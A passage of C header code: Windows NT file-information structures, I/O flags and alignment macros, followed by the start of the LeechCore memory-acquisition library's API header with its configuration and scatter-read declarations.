  * Absolute new end-of-file position as a byte offset from the start of the file.
  * EndOfFile specifies the byte offset to the end of the file.
  * Because this value is zero-based, it actually refers to the first free byte in the file. In other words,
  * EndOfFile is the offset to the byte immediately following the last valid byte in the file.
  */
  LARGE_INTEGER EndOfFile;
  /**
  * File allocation size, in bytes. Usually, this value is a multiple of the sector or cluster size of the underlying physical device.
  */
  LARGE_INTEGER AllocationSize;
  /**
  *  File attributes, which can be any valid combination of the following:
  *
  *   \li \c FILE_ATTRIBUTE_READONLY
  *   \li \c FILE_ATTRIBUTE_HIDDEN
  *   \li \c FILE_ATTRIBUTE_SYSTEM
  *   \li \c FILE_ATTRIBUTE_DIRECTORY
  *   \li \c FILE_ATTRIBUTE_ARCHIVE
  *   \li \c FILE_ATTRIBUTE_NORMAL
  *   \li \c FILE_ATTRIBUTE_TEMPORARY
  *   \li \c FILE_ATTRIBUTE_COMPRESSED
  */
  ULONG FileAttributes;
  /**
  * Specifies the length of the file name string.
  */
  ULONG FileNameLength;
  /**
  * Combined length, in bytes, of the extended attributes (EA) for the file.
  */
  ULONG EaSize;
  /**
  * Specifies the length, in bytes, of the short file name string.
  */
  CCHAR ShortNameLength;
  /**
  * Unicode string containing the short (8.3) name for the file.
  */
  WCHAR ShortName[12];
  /**
  * The 8-byte file reference number for the file. This number is generated and assigned to the file by the file system. 
  * (Note that the FileId is not the same as the 16-byte "file object ID" that was added to NTFS for Microsoft Windows 2000.) 
  */
  LARGE_INTEGER FileId;
  /**
  * Specifies the first character of the file name string. This is followed in memory by the remainder of the string. 
  */
  WCHAR FileName[1];
} FILE_ID_BOTH_DIR_INFORMATION, *PFILE_ID_BOTH_DIR_INFORMATION;

/**
 * \struct FILE_ID_EXTD_BOTH_DIR_INFORMATION
 * \brief Used to query detailed information for the files in a directory.
 */
typedef struct _FILE_ID_EXTD_BOTH_DIR_INFORMATION {
  /**
   * Byte offset of the next FILE_DIRECTORY_INFORMATION entry, if multiple entries are present in a buffer.
   * This member is zero if no other entries follow this one.
   */
  ULONG NextEntryOffset;
  /**
   * Byte offset of the file within the parent directory. This member is undefined for file systems, such as NTFS,
   * in which the position of a file within the parent directory is not fixed and can be changed at any time to maintain sort order.
   */
  ULONG FileIndex;
  /**
   * Time when the file was created.
   */
  LARGE_INTEGER CreationTime;
  /**
   * Last time the file was accessed.
   */
  LARGE_INTEGER LastAccessTime;
  /**
   * Last time information was written to the file.
   */
  LARGE_INTEGER LastWriteTime;
  /**
   * Last time the file was changed.
   */
  LARGE_INTEGER ChangeTime;
  /**
   * Absolute new end-of-file position as a byte offset from the start of the file.
   * EndOfFile specifies the byte offset to the end of the file.
   * Because this value is zero-based, it actually refers to the first free byte in the file. In other words,
   * EndOfFile is the offset to the byte immediately following the last valid byte in the file.
   */
  LARGE_INTEGER EndOfFile;
  /**
   * File allocation size, in bytes. Usually, this value is a multiple of the sector or cluster size of the underlying physical device.
   */
  LARGE_INTEGER AllocationSize;
  /**
   *  File attributes, which can be any valid combination of the following:
   *
   *   \li \c FILE_ATTRIBUTE_READONLY
   *   \li \c FILE_ATTRIBUTE_HIDDEN
   *   \li \c FILE_ATTRIBUTE_SYSTEM
   *   \li \c FILE_ATTRIBUTE_DIRECTORY
   *   \li \c FILE_ATTRIBUTE_ARCHIVE
   *   \li \c FILE_ATTRIBUTE_NORMAL
   *   \li \c FILE_ATTRIBUTE_TEMPORARY
   *   \li \c FILE_ATTRIBUTE_COMPRESSED
   */
  ULONG FileAttributes;
  /**
   * Specifies the length of the file name string.
   */
  ULONG FileNameLength;
  /**
   * Combined length, in bytes, of the extended attributes (EA) for the file.
   */
  ULONG EaSize;
  /**
   * Tag value for the reparse point.
   */
  ULONG ReparsePointTag;
  /**
   * The 128-byte file reference number for the file. This number is generated and assigned to the file by the file system.
   */
  FILE_ID_128 FileId;
  /**
   * Specifies the length, in bytes, of the short file name string.
   */
  CCHAR ShortNameLength;
  /**
   * Unicode string containing the short (8.3) name for the file.
   */
  WCHAR ShortName[12];
  /**
   * Specifies the first character of the file name string. This is followed in memory by the remainder of the string.
   */
  WCHAR FileName[1];
} FILE_ID_EXTD_BOTH_DIR_INFORMATION, *PFILE_ID_EXTD_BOTH_DIR_INFORMATION;

/**
 * \struct FILE_NAMES_INFORMATION
 * \brief Used to query detailed information about the names of files in a directory.
 */
typedef struct _FILE_NAMES_INFORMATION {
  /**
  * Byte offset for the next FILE_NAMES_INFORMATION entry, if multiple entries are present in a buffer.
  * This member is zero if no other entries follow this one. 
  */
  ULONG NextEntryOffset;
  /**
  * Byte offset of the file within the parent directory. This member is undefined for file systems, such as NTFS,
  * in which the position of a file within the parent directory is not fixed and can be changed at any time to maintain sort order. 
  */
  ULONG FileIndex;
  /**
  * Specifies the length of the file name string. 
  */
  ULONG FileNameLength;
  /**
  * Specifies the first character of the file name string. This is followed in memory by the remainder of the string. 
  */
  WCHAR FileName[1];
} FILE_NAMES_INFORMATION, *PFILE_NAMES_INFORMATION;

#define ANSI_DOS_STAR ('<')
#define ANSI_DOS_QM ('>')
#define ANSI_DOS_DOT ('"')

#define DOS_STAR (L'<')
#define DOS_QM (L'>')
#define DOS_DOT (L'"')

/**
 * \struct FILE_INTERNAL_INFORMATION
 * \brief Used to query for the file system's 8-byte file reference number for a file. 
 *
 * The struct is requested during IRP_MJ_QUERY_INFORMATION with query FileInternalInformation
 */
typedef struct _FILE_INTERNAL_INFORMATION {
  /**
  * The 8-byte file reference number for the file. This number is assigned by the file system and is file-system-specific.
  * (Note that this is not the same as the 16-byte "file object ID" that was added to NTFS for Microsoft Windows 2000.) 
  */
  LARGE_INTEGER IndexNumber;
} FILE_INTERNAL_INFORMATION, *PFILE_INTERNAL_INFORMATION;

/**
 * \struct FILE_ID_INFORMATION
 * \brief Contains identification information for a file.
 *
 * This structure is returned from the GetFileInformationByHandleEx function when FileIdInfo is passed in the FileInformationClass parameter.
 *
 * The struct is requested during IRP_MJ_QUERY_INFORMATION with query FileIdInformation
 */
typedef struct _FILE_ID_INFORMATION {
  /**
  * The serial number of the volume that contains a file.
  */
  ULONGLONG VolumeSerialNumber;
  /**
  * The 128-bit file identifier for the file. The file identifier and the volume serial number uniquely identify a file on a single computer.
  * To determine whether two open handles represent the same file, combine the identifier and the volume serial number for each file and compare them.
  */
  FILE_ID_128 FileId;
} FILE_ID_INFORMATION, *PFILE_ID_INFORMATION;

/**
 * \struct FILE_EA_INFORMATION
 * \brief Used to query for the size of the extended attributes (EA) for a file.
 *
 * The struct is requested during IRP_MJ_QUERY_INFORMATION with query FileEaInformation and FileAllInformation
 */
typedef struct _FILE_EA_INFORMATION {
  /**
  * Specifies the combined length, in bytes, of the extended attributes for the file.
  */
  ULONG EaSize;
} FILE_EA_INFORMATION, *PFILE_EA_INFORMATION;

/**
 * \struct FILE_ACCESS_INFORMATION
 * \brief Used to query for or set the access rights of a file.
 *
 * The struct is requested during IRP_MJ_QUERY_INFORMATION with query FileAllInformation
 */
typedef struct _FILE_ACCESS_INFORMATION {
  /**
  * Flags that specify a set of access rights in the access mask of an access control entry.
  * This member is a value of type ACCESS_MASK.
  */
  ACCESS_MASK AccessFlags;
} FILE_ACCESS_INFORMATION, *PFILE_ACCESS_INFORMATION;

/**
 * \struct FILE_MODE_INFORMATION
 * \brief Used to query or set the access mode of a file.
 *
 * The struct is requested during IRP_MJ_QUERY_INFORMATION with query FileAllInformation
 */
typedef struct _FILE_MODE_INFORMATION {
  /**
  *  Specifies the mode in which the file will be accessed following a create-file or open-file operation.
  *  This parameter is either zero or the bitwise OR of one or more of the following file option flags:
  *
  *  \li \c FILE_WRITE_THROUGH
  *  \li \c FILE_SEQUENTIAL_ONLY
  *  \li \c FILE_NO_INTERMEDIATE_BUFFERING
  *  \li \c FILE_SYNCHRONOUS_IO_ALERT
  *  \li \c FILE_SYNCHRONOUS_IO_NONALERT
  *  \li \c FILE_DELETE_ON_CLOSE
  */
  ULONG Mode;
} FILE_MODE_INFORMATION, *PFILE_MODE_INFORMATION;

/**
 * \struct FILE_ALL_INFORMATION
 * \brief Structure is a container for several FILE_XXX_INFORMATION structures.
 *
 * The struct is requested during IRP_MJ_QUERY_INFORMATION with query FileAllInformation
 */
typedef struct _FILE_ALL_INFORMATION {
  /** \see FILE_BASIC_INFORMATION */
  FILE_BASIC_INFORMATION BasicInformation;
  /** \see FILE_STANDARD_INFORMATION */
  FILE_STANDARD_INFORMATION StandardInformation;
  /** \see FILE_INTERNAL_INFORMATION */
  FILE_INTERNAL_INFORMATION InternalInformation;
  /** \see FILE_EA_INFORMATION */
  FILE_EA_INFORMATION EaInformation;
  /** \see FILE_ACCESS_INFORMATION */
  FILE_ACCESS_INFORMATION AccessInformation;
  /** \see FILE_POSITION_INFORMATION */
  FILE_POSITION_INFORMATION PositionInformation;
  /** \see FILE_MODE_INFORMATION */
  FILE_MODE_INFORMATION ModeInformation;
  /** \see FILE_ALIGNMENT_INFORMATION */
  FILE_ALIGNMENT_INFORMATION AlignmentInformation;
  /** \see FILE_NAME_INFORMATION */
  FILE_NAME_INFORMATION NameInformation;
} FILE_ALL_INFORMATION, *PFILE_ALL_INFORMATION;

/**
 * \struct FILE_ALLOCATION_INFORMATION
 * \brief Used to set the allocation size for a file. 
 *
 * The struct is requested during IRP_MJ_SET_INFORMATION with query FileAllocationInformation
 */
typedef struct _FILE_ALLOCATION_INFORMATION {
  /**
  * File allocation size, in bytes. Usually this value is a multiple
  * of the sector or cluster size of the underlying physical device. 
  */
  LARGE_INTEGER AllocationSize;
} FILE_ALLOCATION_INFORMATION, *PFILE_ALLOCATION_INFORMATION;

/**
 * \struct FILE_LINK_INFORMATION
 * \brief Used to create an NTFS hard link to an existing file.
 *
 * The struct is requested during IRP_MJ_SET_INFORMATION with query FileLinkInformation
 */
typedef struct _FILE_LINK_INFORMATION {
  /**
  * Set to TRUE to specify that if the link already exists, it should be replaced with the new link.
  * Set to FALSE if the link creation operation should fail if the link already exists. 
  */
  BOOLEAN ReplaceIfExists;
  /**
  * If the link is to be created in the same directory as the file that is being linked to,
  * or if the FileName member contains the full pathname for the link to be created, this is NULL.
  * Otherwise it is a handle for the directory where the link is to be created.
  */
  HANDLE RootDirectory;
  /**
  * Length, in bytes, of the file name string. 
  */
  ULONG FileNameLength;
  /**
  * The first character of the name to be assigned to the newly created link.
  * This is followed in memory by the remainder of the string.
  * If the RootDirectory member is NULL and the link is to be created in a different directory from the file that is being linked to,
  * this member specifies the full pathname for the link to be created. Otherwise, it specifies only the file name.
  * (See the Remarks section for ZwQueryInformationFile for details on the syntax of this file name string.) 
  */
  WCHAR FileName[1];
} FILE_LINK_INFORMATION, *PFILE_LINK_INFORMATION;

/**
 * \struct FILE_RENAME_INFORMATION
 * \brief Used to rename a file.
 *
 * The struct is requested during IRP_MJ_SET_INFORMATION with query FileRenameInformation
 */
typedef struct _FILE_RENAME_INFORMATION {
  /**
  * Set to TRUE to specify that if a file with the given name already exists, it should be replaced with the given file.
  * Set to FALSE if the rename operation should fail if a file with the given name already exists. 
  */
  BOOLEAN ReplaceIfExists;
  /**
  * If the file is not being moved to a different directory,
  * or if the FileName member contains the full pathname, this member is NULL. Otherwise,
  * it is a handle for the root directory under which the file will reside after it is renamed. 
  */
  HANDLE RootDirectory;
  /**
  * Length, in bytes, of the new name for the file. 
  */
  ULONG FileNameLength;
  /**
  * The first character of a wide-character string containing the new name for the file.
  * This is followed in memory by the remainder of the string. If the RootDirectory member is NULL,
  * and the file is being moved to a different directory, this member specifies the full pathname to be assigned to the file.
  * Otherwise, it specifies only the file name or a relative pathname. 
  */
  WCHAR FileName[1];
} FILE_RENAME_INFORMATION, *PFILE_RENAME_INFORMATION;

/**
 * \struct FILE_STREAM_INFORMATION
 * \brief Used to enumerate the streams for a file. 
 *
 * The struct is requested during IRP_MJ_SET_INFORMATION query FileStreamInformation
 */
typedef struct _FILE_STREAM_INFORMATION {
  /**
  * The offset of the next FILE_STREAM_INFORMATION entry.
  * This member is zero if no other entries follow this one. 
  */
  ULONG NextEntryOffset;
  /**
  * Length, in bytes, of the StreamName string. 
  */
  ULONG StreamNameLength;
  /**
  * Size, in bytes, of the stream. 
  */
  LARGE_INTEGER StreamSize;
  /**
  * File stream allocation size, in bytes. Usually this value is a multiple of the sector
  * or cluster size of the underlying physical device. 
  */
  LARGE_INTEGER StreamAllocationSize;
  /**
  * Unicode string that contains the name of the stream. 
  */
  WCHAR StreamName[1];
} FILE_STREAM_INFORMATION, *PFILE_STREAM_INFORMATION;

/**
 * \struct FILE_FS_LABEL_INFORMATION
 * \brief Used to set the label for a file system volume. 
 *
 * The struct is requested during IRP_MJ_SET_VOLUME_INFORMATION query FileFsLabelInformation
 */
typedef struct _FILE_FS_LABEL_INFORMATION {
  /**
  * Length, in bytes, of the name for the volume. 
  */
  ULONG VolumeLabelLength;
  /**
  * Name for the volume. 
  */
  WCHAR VolumeLabel[1];
} FILE_FS_LABEL_INFORMATION, *PFILE_FS_LABEL_INFORMATION;

/**
 * \struct FILE_FS_VOLUME_INFORMATION
 * \brief Used to query information about a volume on which a file system is mounted. 
 *
 * The struct is requested during IRP_MJ_QUERY_VOLUME_INFORMATION query FileFsVolumeInformation
 */
typedef struct _FILE_FS_VOLUME_INFORMATION {
  /**
  * Time when the volume was created. 
  */
  LARGE_INTEGER VolumeCreationTime;
  /**
  * Serial number of the volume. 
  */
  ULONG VolumeSerialNumber;
  /**
  * Length, in bytes, of the name of the volume. 
  */
  ULONG VolumeLabelLength;
  /**
  * TRUE if the file system supports object-oriented file system objects, FALSE otherwise. 
  */
  BOOLEAN SupportsObjects;
  /**
  * Name of the volume. 
  */
  WCHAR VolumeLabel[1];
} FILE_FS_VOLUME_INFORMATION, *PFILE_FS_VOLUME_INFORMATION;

/**
 * \struct FILE_FS_SIZE_INFORMATION
 * \brief Used to query sector size information for a file system volume. 
 *
 * The struct is requested during IRP_MJ_QUERY_VOLUME_INFORMATION query FileFsSizeInformation
 */
typedef struct _FILE_FS_SIZE_INFORMATION {
  /**
  * Total number of allocation units on the volume that are available to the user associated with the calling thread. 
  * If per-user quotas are in use, this value may be less than the total number of allocation units on the disk. 
  */
  LARGE_INTEGER TotalAllocationUnits;
  /**
  * Total number of free allocation units on the volume that are available to the user associated with the calling thread.
  * If per-user quotas are in use, this value may be less than the total number of free allocation units on the disk.
  */
  LARGE_INTEGER AvailableAllocationUnits;
  /**
  * Number of sectors in each allocation unit.
  */
  ULONG SectorsPerAllocationUnit;
  /**
  * Number of bytes in each sector.
  */
  ULONG BytesPerSector;
} FILE_FS_SIZE_INFORMATION, *PFILE_FS_SIZE_INFORMATION;

/**
 * \struct FILE_FS_FULL_SIZE_INFORMATION
 * \brief Used to query sector size information for a file system volume. 
 *
 * The struct is requested during IRP_MJ_QUERY_VOLUME_INFORMATION query FileFsFullSizeInformation
 */
typedef struct _FILE_FS_FULL_SIZE_INFORMATION {
  /**
  * Total number of allocation units on the volume that are available to the user associated with the calling thread.
  * If per-user quotas are in use, this value may be less than the total number of allocation units on the disk.
  */
  LARGE_INTEGER TotalAllocationUnits;
  /**
  * Total number of free allocation units on the volume that are available to the user associated with the calling thread.
  * If per-user quotas are in use, this value may be less than the total number of free allocation units on the disk.
  */
  LARGE_INTEGER CallerAvailableAllocationUnits;
  /**
  * Total number of free allocation units on the volume. 
  */
  LARGE_INTEGER ActualAvailableAllocationUnits;
  /**
  * Number of sectors in each allocation unit. 
  */
  ULONG SectorsPerAllocationUnit;
  /**
  * Number of bytes in each sector. 
  */
  ULONG BytesPerSector;
} FILE_FS_FULL_SIZE_INFORMATION, *PFILE_FS_FULL_SIZE_INFORMATION;

/**
 * \struct FILE_FS_ATTRIBUTE_INFORMATION
 * \brief Used to query attribute information for a file system.
 *
 * The struct is requested during IRP_MJ_QUERY_VOLUME_INFORMATION query FileFsAttributeInformation
 */
typedef struct _FILE_FS_ATTRIBUTE_INFORMATION {
  /**
  * Bitmask of flags specifying attributes of the specified file system.
  * \see https://msdn.microsoft.com/en-us/library/windows/hardware/ff540251(v=vs.85).aspx
  */
  ULONG FileSystemAttributes;
  /**
  * Maximum file name component length, in bytes, supported by the specified file system.
  * A file name component is that portion of a file name between backslashes.
  */
  LONG MaximumComponentNameLength;
  /**
  * Length, in bytes, of the file system name.
  */
  ULONG FileSystemNameLength;
  /**
  * File system name.
  */
  WCHAR FileSystemName[1];
} FILE_FS_ATTRIBUTE_INFORMATION, *PFILE_FS_ATTRIBUTE_INFORMATION;

/**
 * \struct FILE_NETWORK_OPEN_INFORMATION
 * \brief Used as an argument to ZwQueryInformationFile.
 *
 * The struct is requested during IRP_MJ_QUERY_VOLUME_INFORMATION query FileNetworkOpenInformation
 */
typedef struct _FILE_NETWORK_OPEN_INFORMATION {
  /**
  * Specifies the time that the file was created.
  */
  LARGE_INTEGER CreationTime;
  /**
  * Specifies the time that the file was last accessed.
  */
  LARGE_INTEGER LastAccessTime;
  /**
  * Specifies he time that the file was last written to.
  */
  LARGE_INTEGER LastWriteTime;
  /**
  * Specifies the time that the file was last changed.
  */
  LARGE_INTEGER ChangeTime;
  /**
  * Specifies the file allocation size, in bytes. Usually,
  * this value is a multiple of the sector or cluster size of the underlying physical device.
  */
  LARGE_INTEGER AllocationSize;
  /**
  * Specifies the absolute end-of-file position as a byte offset from the start of the file.
  * EndOfFile specifies the byte offset to the end of the file. Because this value is zero-based,
  * it actually refers to the first free byte in the file. In other words,
  * EndOfFile is the offset to the byte immediately following the last valid byte in the file.
  */
  LARGE_INTEGER EndOfFile;
  /**
  * Specifies one or more FILE_ATTRIBUTE_XXX flags. For descriptions of these flags,
  * see the documentation of the GetFileAttributes function in the Microsoft Windows SDK.
  */
  ULONG FileAttributes;
} FILE_NETWORK_OPEN_INFORMATION, *PFILE_NETWORK_OPEN_INFORMATION;

/**
 * \struct FILE_NETWORK_PHYSICAL_NAME_INFORMATION
 * \brief Contains the full UNC physical pathname for a file or directory on a remote file share.
 *
 * The struct is requested during IRP_MJ_QUERY_VOLUME_INFORMATION query FileNetworkPhysicalNameInformation
 */
typedef struct _FILE_NETWORK_PHYSICAL_NAME_INFORMATION {
  /**
  * The length, in bytes, of the physical name in FileName.
  */
  ULONG FileNameLength;
  /**
  * The full UNC path of the network file share of the target.
  */
  WCHAR FileName[1];
} FILE_NETWORK_PHYSICAL_NAME_INFORMATION,
    *PFILE_NETWORK_PHYSICAL_NAME_INFORMATION;

#define SL_RESTART_SCAN 0x01
#define SL_RETURN_SINGLE_ENTRY 0x02
#define SL_INDEX_SPECIFIED 0x04
#define SL_FORCE_ACCESS_CHECK 0x01

#define SL_OPEN_PAGING_FILE 0x02
#define SL_OPEN_TARGET_DIRECTORY 0x04
#define SL_CASE_SENSITIVE 0x80

#define ALIGN_DOWN(length, type) ((ULONG)(length) & ~(sizeof(type) - 1))

#define ALIGN_UP(length, type)                                                 \
  (ALIGN_DOWN(((ULONG)(length) + sizeof(type) - 1), type))

#define ALIGN_DOWN_POINTER(address, type)                                      \
  ((PVOID)((ULONG_PTR)(address) & ~((ULONG_PTR)sizeof(type) - 1)))

#define ALIGN_UP_POINTER(address, type)                                        \
  (ALIGN_DOWN_POINTER(((ULONG_PTR)(address) + sizeof(type) - 1), type))

#define WordAlign(Val) (ALIGN_UP(Val, WORD))

#define WordAlignPtr(Ptr) (ALIGN_UP_POINTER(Ptr, WORD))

#define LongAlign(Val) (ALIGN_UP(Val, LONG))

#define LongAlignPtr(Ptr) (ALIGN_UP_POINTER(Ptr, LONG))

#define QuadAlign(Val) (ALIGN_UP(Val, ULONGLONG))

#define QuadAlignPtr(Ptr) (ALIGN_UP_POINTER(Ptr, ULONGLONG))

#define IsPtrQuadAligned(Ptr) (QuadAlignPtr(Ptr) == (PVOID)(Ptr))

// from wdm.h
#define FILE_SUPERSEDE 0x00000000
#define FILE_OPEN 0x00000001
#define FILE_CREATE 0x00000002
#define FILE_OPEN_IF 0x00000003
#define FILE_OVERWRITE 0x00000004
#define FILE_OVERWRITE_IF 0x00000005
#define FILE_MAXIMUM_DISPOSITION 0x00000005

#define FILE_DIRECTORY_FILE 0x00000001
#define FILE_WRITE_THROUGH 0x00000002
#define FILE_SEQUENTIAL_ONLY 0x00000004
#define FILE_NO_INTERMEDIATE_BUFFERING 0x00000008

#define FILE_SYNCHRONOUS_IO_ALERT 0x00000010
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
#define FILE_NON_DIRECTORY_FILE 0x00000040
#define FILE_CREATE_TREE_CONNECTION 0x00000080

#define FILE_COMPLETE_IF_OPLOCKED 0x00000100
#define FILE_NO_EA_KNOWLEDGE 0x00000200
#define FILE_OPEN_REMOTE_INSTANCE 0x00000400
#define FILE_RANDOM_ACCESS 0x00000800

#define FILE_DELETE_ON_CLOSE 0x00001000
#define FILE_OPEN_BY_FILE_ID 0x00002000
#define FILE_OPEN_FOR_BACKUP_INTENT 0x00004000
#define FILE_NO_COMPRESSION 0x00008000

#if (_WIN32_WINNT >= _WIN32_WINNT_WIN7)
#define FILE_OPEN_REQUIRING_OPLOCK 0x00010000
#define FILE_DISALLOW_EXCLUSIVE 0x00020000
#endif /* _WIN32_WINNT >= _WIN32_WINNT_WIN7 */
#if (_WIN32_WINNT >= _WIN32_WINNT_WIN8)
#define FILE_SESSION_AWARE 0x00040000
#endif /* _WIN32_WINNT >= _WIN32_WINNT_WIN7 */

#define FILE_RESERVE_OPFILTER 0x00100000
#define FILE_OPEN_REPARSE_POINT 0x00200000
#define FILE_OPEN_NO_RECALL 0x00400000
#define FILE_OPEN_FOR_FREE_SPACE_QUERY 0x00800000

#define FILE_VALID_OPTION_FLAGS 0x00ffffff

#define FILE_SUPERSEDED 0x00000000
#define FILE_OPENED 0x00000001
#define FILE_CREATED 0x00000002
#define FILE_OVERWRITTEN 0x00000003
#define FILE_EXISTS 0x00000004
#define FILE_DOES_NOT_EXIST 0x00000005

#define FILE_WRITE_TO_END_OF_FILE 0xffffffff
#define FILE_USE_FILE_POINTER_POSITION 0xfffffffe

/**
 * \struct UNICODE_STRING
 * \brief Structure is used to define Unicode strings.
 */
typedef struct _UNICODE_STRING {
  /**
  * The length, in bytes, of the string stored in Buffer.
  */
  USHORT Length;
  /**
  * The length, in bytes, of Buffer.
  */
  USHORT MaximumLength;
  /**
  * Pointer to a buffer used to contain a string of wide characters.
  */
  PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

#endif // FILEINFO_H_

```

`includes/leechcore.h`:

```h
// leechcore.h : external header of the LeechCore library.
//
// LeechCore is a library which abstracts away reading and writing to various
// software and hardware acquisition sources. Sources ranges from memory dump
// files to driver backed live memory to hardware (FPGA) DMA backed memory.
//
// LeechCore built-in device support may be extended with external plugin
// device drivers placed as .dll or .so files in the same folder as LeechCore.
//
// For more information please consult the LeechCore information on Github:
// - README: https://github.com/ufrisk/LeechCore
// - GUIDE:  https://github.com/ufrisk/LeechCore/wiki
//
// (c) Ulf Frisk, 2020-2022
// Author: Ulf Frisk, pcileech@frizk.net
//
// Header Version: 2.9.1
//

#ifndef __LEECHCORE_H__
#define __LEECHCORE_H__
#ifdef __cplusplus
extern "C" {
#endif /* __cplusplus */

    //-----------------------------------------------------------------------------
    // OS COMPATIBILITY BELOW:
    //-----------------------------------------------------------------------------

#ifdef _WIN32

#include <Windows.h>
#define EXPORTED_FUNCTION                   __declspec(dllexport)
    typedef unsigned __int64                    QWORD, *PQWORD;

#endif /* _WIN32 */
#ifdef LINUX

#include <inttypes.h>
#include <stdlib.h>
#define EXPORTED_FUNCTION                   __attribute__((visibility("default")))
    typedef void                                VOID, *PVOID, *HANDLE, **PHANDLE, *HMODULE;
    typedef long long unsigned int              QWORD, *PQWORD, ULONG64, *PULONG64;
    typedef size_t                              SIZE_T, *PSIZE_T;
    typedef uint64_t                            FILETIME, *PFILETIME;
    typedef uint32_t                            DWORD, *PDWORD, *LPDWORD, BOOL, *PBOOL, NTSTATUS;
    typedef uint16_t                            WORD, *PWORD;
    typedef uint8_t                             BYTE, *PBYTE, *LPBYTE, UCHAR;
    typedef char                                CHAR, *PCHAR, *LPSTR, *LPCSTR;
    typedef uint16_t                            WCHAR, *PWCHAR, *LPWSTR, *LPCWSTR;
#define MAX_PATH                            260
#define _In_
#define _In_z_
#define _In_opt_
#define _In_reads_(x)
#define _In_reads_opt_(x)
#define _Inout_
#define _Inout_bytecount_(x)
#define _Inout_opt_
#define _Inout_updates_opt_(x)
#define _Out_
#define _Out_opt_
#define _Out_writes_(x)
#define _Out_writes_bytes_opt_(x)
#define _Out_writes_opt_(x)
#define _Out_writes_to_(x,y)
#define _When_(x,y)
#define _Frees_ptr_opt_
#define _Post_ptr_invalid_
#define _Check_return_opt_
#define _Printf_format_string_
#define _Success_(x)

#endif /* LINUX */



    //-----------------------------------------------------------------------------
    // Create and Close LeechCore devices:
    // It's possible to create multiple LeechCore devices in parallel and also of
    // different types if the underlying device will allow this. LeechCore will
    // automatically take care of and abstract away any hardware/software issues
    // with regards to the underlying devices.
    //
    // For more information about supported devices please check out the LeechCore
    // guide at: https://github.com/ufrisk/LeechCore/wiki
    //-----------------------------------------------------------------------------

#define LC_CONFIG_VERSION                       0xc0fd0002
#define LC_CONFIG_ERRORINFO_VERSION             0xc0fe0002

#define LC_CONFIG_PRINTF_ENABLED                0x01
#define LC_CONFIG_PRINTF_V                      0x02
#define LC_CONFIG_PRINTF_VV                     0x04
#define LC_CONFIG_PRINTF_VVV                    0x08

    typedef struct LC_CONFIG {
        // below are set by caller
        DWORD dwVersion;                        // must equal LC_CREATE_VERSION
        DWORD dwPrintfVerbosity;                // printf verbosity according to LC_PRINTF_*
        CHAR szDevice[MAX_PATH];                // device connection string - see wiki for additional info.
        CHAR szRemote[MAX_PATH];                // remote connection striLC_CONFIG_VERSIONng - see wiki for additional info.
        _Check_return_opt_ int(*pfn_printf_opt)(_In_z_ _Printf_format_string_ char const *const _Format, ...);
        // below are set by caller, updated by LeecCore
        QWORD paMax;                            // max physical address (disables any max address auto-detect).
        // below are set by LeechCore
        BOOL fVolatile;
        BOOL fWritable;
        BOOL fRemote;
        BOOL fRemoteDisableCompress;
        CHAR szDeviceName[MAX_PATH];            // device name - such as 'fpga' or 'file'.
    } LC_CONFIG, *PLC_CONFIG;

    typedef struct tdLC_CONFIG_ERRORINFO {
        DWORD dwVersion;                        // must equal LC_CONFIG_ERRORINFO_VERSION
        DWORD cbStruct;
        DWORD _FutureUse[16];
        BOOL fUserInputRequest;
        DWORD cwszUserText;
        WCHAR wszUserText[];
    } LC_CONFIG_ERRORINFO, *PLC_CONFIG_ERRORINFO, **PPLC_CONFIG_ERRORINFO;

    /*
    * Create a new LeechCore device according to the supplied configuration.
    * CALLER LcMemFree: ppLcCreateErrorInfo
    * -- pLcCreateConfig
    * -- ppLcCreateErrorInfo = ptr to receive function allocated struct with error
    *       information upon function failure. This info may contain a user message
    *       requesting user action as an example. Any returned struct should be
    *       free'd by a call to LcMemFree().
    * -- return
    */
    _Success_(return != NULL)
        EXPORTED_FUNCTION HANDLE LcCreate(
            _Inout_ PLC_CONFIG pLcCreateConfig
        );

    _Success_(return != NULL)
        EXPORTED_FUNCTION HANDLE LcCreateEx(
            _Inout_ PLC_CONFIG pLcCreateConfig,
            _Out_opt_ PPLC_CONFIG_ERRORINFO ppLcCreateErrorInfo
        );

    /*
    * Close a LeechCore handle and free any resources no longer needed.
    */
    EXPORTED_FUNCTION VOID LcClose(
        _In_opt_ _Post_ptr_invalid_ HANDLE hLC
    );



    //-----------------------------------------------------------------------------
    // Read and Write memory from underlying device either using contiguous method
    // or more recommended scatter method.
    //
    // The MEM_SCATTER struct allows reading and writing of discontiguous memory
    // chunks which must adhere to the following rules:
    // - maximum size = 0x1000 (4096) bytes = recommended size.
    // - minimum size = 2 DWORDs (8 bytes).
    // - must be DWORD (4 byte) aligned.
    // - must never cross 0x1000 page boundary.
    // - max value of iStack = MEM_SCATTER_STACK_SIZE - 2.
    //-----------------------------------------------------------------------------

#define MEM_SCATTER_VERSION                 0xc0fe0002
#define MEM_SCATTER_STACK_SIZE              12

    typedef struct tdMEM_SCATTER {
        DWORD version;                          // MEM_SCATTER_VERSION
        BOOL f;                                 // TRUE = success data in pb, FALSE = fail or not yet read.
        QWORD qwA;                              // address of memory to read
        union {
            PBYTE pb;                           // buffer to hold memory contents
            QWORD _Filler;
        };
        DWORD cb;                               // size of buffer to hold memory contents.
        DWORD iStack;                           // internal stack pointer
        QWORD vStack[MEM_SCATTER_STACK_SIZE];   // internal stack
    } MEM_SCATTER, *PMEM_SCATTER, **PPMEM_SCATTER;

#define MEM_SCATTER_ADDR_INVALID            ((QWORD)-1)
#define MEM_SCATTER_ADDR_ISINVALID(pMEM)    (pMEM->qwA == (QWORD)-1)
#define MEM_SCATTER_ADDR_ISVALID(pMEM)      (pMEM->qwA != (QWORD)-1)
#define MEM_SCATTER_STACK_PUSH(pMEM, v)     (pMEM->vStack[pMEM->iStack++] = (QWORD)v)
#define MEM_SCATTER_STACK_PEEK(pMEM, i)     (pMEM->vStack[pMEM->iStack - i])
#define MEM_SCATTER_STACK_SET(pMEM, i, v)   (pMEM->vStack[pMEM->iStack - i] = (QWORD)v)
#define MEM_SCATTER_STACK_ADD(pMEM, i, v)   (pMEM->vStack[pMEM->iStack - i] += (QWORD)v)
#define MEM_SCATTER_STACK_POP(pMEM)         (pMEM->vStack[--pMEM->iStack])

    /*
    * Free LeechCore allocated memory such as memory allocated by the
    * LcAllocScatter / LcCommand functions.
    * -- pv
    */
    EXPORTED_FUNCTION VOID LcMemFree(
        _Frees_ptr_opt_ PVOID pv
    );

    /*
    * Allocate and pre-initialize empty MEMs including a 0x1000 buffer for each
